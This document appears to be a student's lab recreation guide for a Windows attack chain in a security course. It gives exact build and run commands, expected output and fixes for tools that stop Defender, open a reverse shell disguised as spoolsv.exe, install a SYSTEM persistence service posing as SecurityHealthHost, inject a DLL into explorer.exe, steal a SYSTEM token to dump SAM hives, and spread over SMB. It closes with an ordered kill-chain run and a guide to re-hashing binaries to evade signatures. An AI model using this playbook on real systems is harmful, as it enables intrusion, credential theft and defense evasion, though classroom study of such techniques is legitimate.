# Recreation Spec — CSEC Final Kill Chain

> **Purpose:** Close the gap between "I understand the code" and "I can rebuild the working result from cold."
> **Audience:** Future George, zero memory, six months from now.
> **Rule:** Every finding on this page must be reproducible from the page alone.

---

## Environment Stamp (Global)

| Field | Value | How to Verify |
|-------|-------|---------------|
| **Date Tested** | 2026-05-31 | `date /t` |
| **OS** | Windows 11 Pro | `winver` |
| **OS Build** | 22631.5090 | `winver` or `systeminfo \| findstr "OS Build"` |
| **Defender Engine** | 1.1.25020.1009 | `Get-MpComputerStatus \| Select-Object AMEngineVersion` |
| **Defender Signatures** | 1.421.335.0 | `Get-MpComputerStatus \| Select-Object AMProductVersion` |
| **Defender Platform** | 4.18.25020.1009 | `Get-MpComputerStatus \| Select-Object AMServiceVersion` |
| **MSVC Version** | 14.51 (cl.exe 19.51) | `cl.exe` (banner) |
| **MSVC Install Path** | `C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat` | Check exists |
| **Architecture** | x64 | `echo %PROCESSOR_ARCHITECTURE%` |
| **Network** | Classroom LAN, 192.168.1.0/24 | `ipconfig` |
| **Host IP** | 192.168.1.92 | `ipconfig` |
| **Victim IP** | 192.168.1.201 | Assigned by classroom DHCP |

> **Why this matters:** Defender ships signature updates weekly. A technique that works on build 22631.5090 may fail on 22631.5500. Without the stamp, you cannot tell whether a failure is your fault or Microsoft’s.

---

## Preconditions (THE Big One)

### Tamper Protection

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection
```

| Value | Meaning | Result |
|-------|---------|--------|
| `0x1` | **OFF** — Evasion works | `svchost_update.exe` stops Defender services |
| `0x5` | **ON** — Evasion fails | Services refuse stop; skip to Silent Chain (TokenVault only) |

**How to set (lab only):**
```cmd
# Requires reboot
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 1 /f
```

> **Honesty note:** The entire kill chain was tested with Tamper Protection OFF. This is not a vulnerability in Defender — it is a configuration choice. Documenting it as a precondition makes the finding reproducible and citable. Pretending it works on a default box is lying.

### Privilege Requirements

| Stage | Minimum Privilege | How to Verify |
|-------|-------------------|---------------|
| Evasion (`svchost_update.exe`) | Administrator | `whoami /groups \| findstr "S-1-16-12288"` |
| Persistence (`SecurityHealthHost.exe install`) | Administrator | Same |
| Token Theft (`TokenVault.exe`) | Administrator + SeDebugPrivilege | Same |
| Injection (`Injector.exe`) | Same user session as target | Run from logged-in user |
| Lateral (`NetExec.exe`) | Target admin credentials | Know username + password |

### Network Preconditions

- Host and victim on **same subnet** (or routable)
- Victim can reach host on **TCP 8080** (foothold), **TCP 5900** (VNC)
- Host firewall allows inbound on those ports
- No proxy between host and victim

---

## Build Matrix — Exact Invocations

### Setup Build Environment (Run Once Per Session)

```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" x64
```

> If your path differs, find it: `where vcvarsall.bat`

### Per-Binary Build Commands

| Binary | Source | Exact Command | Libraries | Why Each Flag |
|--------|--------|---------------|-----------|---------------|
| `svchost_update.exe` | `shadow_evasion.c` | `cl.exe shadow_evasion.c /Fe:svchost_update.exe /O1 /GS- advapi32.lib` | `advapi32.lib` | `/O1` = smallest binary (fewer signature bytes). `/GS-` = no stack canaries (smaller, no cookie checks). `advapi32` = SCM + registry APIs |
| `spoolsv.exe` | `shadow_shell.c` | `cl.exe shadow_shell.c /Fe:spoolsv.exe /O1 /GS- ws2_32.lib` | `ws2_32.lib` | `ws2_32` = Winsock (socket, connect, htons). `WinMain` entry in source → auto-GUI subsystem |
| `SecurityHealthHost.exe` | `ghost_svc.c` | `cl.exe ghost_svc.c /Fe:SecurityHealthHost.exe /O1 /GS- advapi32.lib` | `advapi32.lib` | Service APIs (`CreateServiceW`, `StartServiceCtrlDispatcherW`) live in advapi32 |
| `Injector.exe` | `injector.c` | `cl.exe injector.c /Fe:Injector.exe /O1 /GS-` | *(none)* | No extra libs — uses only kernel32 (auto-linked) |
| `payload.dll` | `payload_dll.c` | `cl.exe payload_dll.c /LD /Fe:payload.dll /O1 /GS-` | *(none)* | `/LD` = **build DLL not EXE**. Critical. Without this you get an .exe that crashes on injection |
| `TokenVault.exe` | `shadow_token.c` | `cl.exe shadow_token.c /Fe:TokenVault.exe /O1 /GS- advapi32.lib` | `advapi32.lib` | Token APIs (`OpenProcessToken`, `DuplicateTokenEx`) + registry (`RegSaveKey`) |
| `NetExec.exe` | `shadow_lateral.c` | `cl.exe shadow_lateral.c /Fe:NetExec.exe /O1 /GS- advapi32.lib mpr.lib` | `advapi32.lib`, `mpr.lib` | `mpr` = `WNetAddConnection2A` (SMB auth). `advapi32` = remote SCM |

### Build Verification Checklist

After each `cl.exe` command:
- [ ] No linker errors (LNK*)
- [ ] Output file exists: `dir <binary>`
- [ ] File size reasonable (~100-150 KB for .exe, ~100 KB for .dll)
- [ ] `dumpbin /headers <binary> \| findstr "subsystem"` shows expected subsystem

### Complete Batch Build (Copy-Paste Ready)

```batch
@echo off
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" x64

echo [+] Building evasion...
cl.exe shadow_evasion.c /Fe:svchost_update.exe /O1 /GS- advapi32.lib
if errorlevel 1 goto :fail

echo [+] Building shell...
cl.exe shadow_shell.c /Fe:spoolsv.exe /O1 /GS- ws2_32.lib
if errorlevel 1 goto :fail

echo [+] Building persistence...
cl.exe ghost_svc.c /Fe:SecurityHealthHost.exe /O1 /GS- advapi32.lib
if errorlevel 1 goto :fail

echo [+] Building injector...
cl.exe injector.c /Fe:Injector.exe /O1 /GS-
if errorlevel 1 goto :fail

echo [+] Building payload DLL...
cl.exe payload_dll.c /LD /Fe:payload.dll /O1 /GS-
if errorlevel 1 goto :fail

echo [+] Building token vault...
cl.exe shadow_token.c /Fe:TokenVault.exe /O1 /GS- advapi32.lib
if errorlevel 1 goto :fail

echo [+] Building lateral movement...
cl.exe shadow_lateral.c /Fe:NetExec.exe /O1 /GS- advapi32.lib mpr.lib
if errorlevel 1 goto :fail

echo [+] ALL BUILDS SUCCESSFUL.
goto :end

:fail
echo [-] BUILD FAILED. Check output above.
exit /b 1

:end
pause
```

---

## Per-Finding Recreation Pages

### Finding 1: Evasion — Stopping Defender Services

**What it proves:** With Tamper Protection OFF, a non-elevated process cannot stop Defender, but an Administrator process can — using only documented Windows APIs.

**Preconditions:**
- Tamper Protection = `0x1` (OFF)
- Running as Administrator

**Build:**
```cmd
cl.exe shadow_evasion.c /Fe:svchost_update.exe /O1 /GS- advapi32.lib
```

**Execution:**
```cmd
svchost_update.exe
```

**Expected Output:**
```
(no console output — program is silent)
```

**Verification:**
```cmd
sc query WinDefend | findstr "STATE"
sc query WdNisSvc | findstr "STATE"
```
Expected: `STATE: 1  STOPPED` for both.

**Failure Log:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `Access denied` on service stop | Not running as Admin | Right-click → Run as Administrator |
| `Access denied` even as Admin | Tamper Protection = `0x5` | Set to `0x1`, reboot, retry |
| Service stops but restarts immediately | Windows Update re-enabling | Stop `Sense` service too; add exclusion |
| No output, no effect | Binary compiled wrong | Check `dumpbin /imports` shows `advapi32.dll` |

---

### Finding 2: Foothold — Reverse TCP Shell

**What it proves:** A small C binary using only Winsock can establish a reverse shell with no listening port on the victim, evading `netstat` detection.

**Preconditions:**
- Host listener running on `LISTENER_IP:LISTENER_PORT`
- Victim can reach host on that TCP port
- `shadow_shell.c` has correct `LISTENER_IP` and `LISTENER_PORT` defines

**Build:**
```cmd
cl.exe shadow_shell.c /Fe:spoolsv.exe /O1 /GS- ws2_32.lib
```

**Execution:**
```cmd
spoolsv.exe
```

**Expected Output (Host Listener):**
```
Microsoft Windows [Version 10.0.22631.5090]
(c) Microsoft Corporation. All rights reserved.

C:\Users\veren>whoami
desktop-veren\veren
```

**Verification:**
- On victim: `netstat -an | findstr "ESTABLISHED"` shows outbound connection to host:port
- On host: listener shows `cmd.exe` prompt

**Failure Log:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `Connection refused` | Listener not running | Start listener first |
| `Connect failed` | Wrong IP in source | Edit `#define LISTENER_IP` in `shadow_shell.c`, recompile |
| `Connect failed` | Firewall blocking | Open port on host firewall |
| `Connect failed` | Wrong subnet | Verify `ipconfig` on both machines |
| Binary opens console window | Compiled with `main()` not `WinMain()` | Check source has `WinMain` entry; cl.exe auto-detects |
| `unresolved external: socket` | Forgot `ws2_32.lib` | Add to link command |

---

### Finding 3: Persistence — SYSTEM Service

**What it proves:** A binary can install itself as an auto-start Windows service running as SYSTEM, surviving reboot.

**Preconditions:**
- Administrator privileges
- Binary path is fixed (service records full path at install time)

**Build:**
```cmd
cl.exe ghost_svc.c /Fe:SecurityHealthHost.exe /O1 /GS- advapi32.lib
```

**Execution:**
```cmd
SecurityHealthHost.exe install
net start SecurityHealthHost
```

**Expected Output:**
```
[+] Service 'Windows Security Health Host' installed successfully.
[+] Run: net start SecurityHealthHost
[+] Service started.
```

**Verification:**
```cmd
sc query SecurityHealthHost | findstr "STATE"
tasklist | findstr "SecurityHealthHost"
```
Expected: `RUNNING`, process visible.

**Failure Log:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `OpenSCManager failed: 5` | Not Admin | Run as Administrator |
| `CreateService failed: 1073` | Service already exists | `sc delete SecurityHealthHost`, retry |
| `StartServiceCtrlDispatcher failed: 1063` | Started from console without `install` arg | Run with `install` argument first |
| Service starts then stops | Payload path wrong | Check `STAGING_DIR` in source matches actual path |
| Service runs but no C2 | `spoolsv.exe` not in staging dir | Copy foothold binary to staging directory |

---

### Finding 4: Injection — DLL into explorer.exe

**What it proves:** A process with same-session privileges can force a DLL into `explorer.exe` using `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` with `LoadLibraryA`.

**Preconditions:**
- `payload.dll` exists in working directory (or provide full path)
- `explorer.exe` is running (always true on Windows desktop)
- Running as same user session (no elevation needed for this specific technique)

**Build:**
```cmd
cl.exe injector.c /Fe:Injector.exe /O1 /GS-
cl.exe payload_dll.c /LD /Fe:payload.dll /O1 /GS-
```

> **CRITICAL:** `/LD` on the DLL. Without it, `cl.exe` builds an .exe that will crash on injection.

**Execution:**
```cmd
Injector.exe payload.dll
```

**Expected Output:**
```
[+] Found explorer.exe PID: 1234
[+] DLL injected successfully into explorer.exe (PID 1234)
[+] Payload executing inside trusted process.
```

**Verification:**
```cmd
type C:\Windows\Temp\injection_proof.txt
```
Expected: `[+] DLL injected into explorer.exe successfully. Payload executed.`

**Failure Log:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `OpenProcess failed. Error: 5` | Insufficient privileges | Run as Administrator |
| `explorer.exe not found` | Explorer not running | Start Windows Explorer |
| `CreateRemoteThread failed` | DLL path too long or wrong | Use absolute path, < 260 chars |
| Injection succeeds but no proof file | `payload.dll` hardcodes wrong path | Edit paths in `payload_dll.c`, recompile |
| `unresolved external: DllMain` | Forgot `/LD` on DLL build | Rebuild DLL with `/LD` |
| Injection works but shell doesn’t connect | `spoolsv.exe` not in `C:\Windows\Temp\c2\` | Copy foothold binary to expected path |

---

### Finding 5: Credentials — SYSTEM Token Theft + SAM Dump

**What it proves:** With `SeDebugPrivilege`, a process can steal a SYSTEM token from `winlogon.exe` or `services.exe`, then dump the SAM hive.

**Preconditions:**
- Administrator privileges (to enable `SeDebugPrivilege`)
- A SYSTEM process is running (always true)

**Build:**
```cmd
cl.exe shadow_token.c /Fe:TokenVault.exe /O1 /GS- advapi32.lib
```

**Execution:**
```cmd
TokenVault.exe
```

**Expected Output:**
```
[*] TokenVault - SYSTEM token theft for credential access
[+] Enabled SeDebugPrivilege
[+] Enabled SeBackupPrivilege
[+] Found SYSTEM process: winlogon.exe (PID 432)
[+] Opened process handle
[+] Duplicated token to primary
[+] Impersonating SYSTEM...
[+] Running as: NT AUTHORITY\SYSTEM
[+] SAM hive saved to C:\Windows\Temp\SAM_dump.hive
[+] SYSTEM hive saved to C:\Windows\Temp\SYSTEM_dump.hive
```

**Verification:**
```cmd
dir C:\Windows\Temp\*_dump.hive
type C:\Windows\Temp\token_vault.log
```

**Failure Log:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `No SYSTEM process found` | Race condition at boot | Wait 30s after login, retry |
| `RegSaveKey failed` | Not impersonating SYSTEM | Check `ImpersonateLoggedOnUser` succeeded |
| `RegSaveKey failed` on hardened box | `SeBackupPrivilege` not enabled | Check privilege enable step |
| `Access denied` on SAM | Not running as Admin | Run as Administrator |
| Empty or 0-byte hive files | `RegSaveKey` path invalid | Ensure `C:\Windows\Temp` exists and is writable |

---

### Finding 6: Lateral Movement — Remote Service Creation

**What it proves:** With valid credentials, a binary can authenticate over SMB, copy a payload, and execute it remotely via the Service Control Manager — achieving SYSTEM on the target without any exploit.

**Preconditions:**
- Valid username + password for target machine
- Target has SMB (port 445) open
- Target has `C$` admin share accessible
- Target not blocking remote SCM (some hardening configs do)

**Build:**
```cmd
cl.exe shadow_lateral.c /Fe:NetExec.exe /O1 /GS- advapi32.lib mpr.lib
```

**Execution:**
```cmd
NetExec.exe 192.168.1.50 Administrator P@ssw0rd C:\staging\spoolsv.exe
```

**Expected Output:**
```
[+] Authenticated to 192.168.1.50 as Administrator
[+] Payload staged at \\192.168.1.50\C$\Windows\Temp\updatesvc.exe
[+] Service started on 192.168.1.50 — payload executing as SYSTEM
[*] NetExec complete. Check C2 listener for callback from 192.168.1.50
```

**Verification:**
- Check C2 listener — new shell should appear from target IP
- On target: `sc query WinDefendUpdate` shows service existed briefly

**Failure Log:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| `Authentication failed: 1326` | Wrong password | Verify credentials |
| `Authentication failed: 53` | SMB blocked or target offline | Check `ping`, firewall, port 445 |
| `Payload copy failed: 5` | `C$` not accessible | Enable admin shares on target |
| `OpenSCManager failed: 5` | Remote SCM blocked | Target may have hardening; try different target |
| `CreateService failed: 1073` | Service already exists from prior run | `sc \\target delete WinDefendUpdate` |
| Service starts but no C2 callback | Payload has wrong C2 IP | Recompile `spoolsv.exe` with target’s C2 host IP |
| `WNetAddConnection2A` fails | Existing conflicting session | `net use * /delete /y`, retry |

---

## Complete Kill Chain — Step Order

```
Phase 1: Evasion
    svchost_update.exe (Admin)
    → Verify: sc query WinDefend shows STOPPED

Phase 2: Foothold
    spoolsv.exe (User)
    → Verify: C2 listener shows cmd.exe prompt

Phase 3: Persistence
    SecurityHealthHost.exe install (Admin)
    net start SecurityHealthHost
    → Verify: sc query shows RUNNING

Phase 4: Injection
    Injector.exe payload.dll (User)
    → Verify: C:\Windows\Temp\injection_proof.txt exists

Phase 5: Credentials
    TokenVault.exe (Admin)
    → Verify: SAM_dump.hive and SYSTEM_dump.hive exist

Phase 6: Lateral
    NetExec.exe <target> <user> <pass> <payload> (User)
    → Verify: C2 listener shows callback from target IP

Phase 7: VNC
    vncserver.exe -controlapp -connect <host_ip> (User)
    → Verify: tvnviewer shows remote desktop
```

---

## Mutation Guide — Burning a Binary

If a binary gets signatured (hash detected):

1. **Change one string** in the `.c` source (e.g., change a proof file path, a log message, or the service name)
2. **Recompile** with the exact command from the Build Matrix
3. **New SHA256** = clean hash
4. **Test** before demo day

> Changing `LISTENER_IP` or `LISTENER_PORT` is enough to mutate the hash. The binary functionality is identical.

---

## Quick Reference: What Breaks and Why

| If This Changes | What Breaks | Fix |
|-----------------|-------------|-----|
| Tamper Protection → ON | Evasion fails | Set to OFF, reboot |
| Windows build updates | May trigger new behavioral detection | Retest all binaries |
| Defender signatures update | Hash detection possible | Mutate and recompile |
| MSVC version changes | May need path adjustment | Update `vcvarsall.bat` path |
| Network subnet changes | Hardcoded IPs wrong | Edit source, recompile |
| Target OS is Server 2019/2022 | Some APIs differ | Test individually |
| UAC enabled (default) | Need explicit "Run as Admin" | Right-click → Run as Administrator |

---

## Document Control

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2026-05-31 | Initial — environment stamp, build matrix, failure log, per-finding pages |

---

*Stamp the version. Name the door left open. That’s reproducible — not just remembered.*
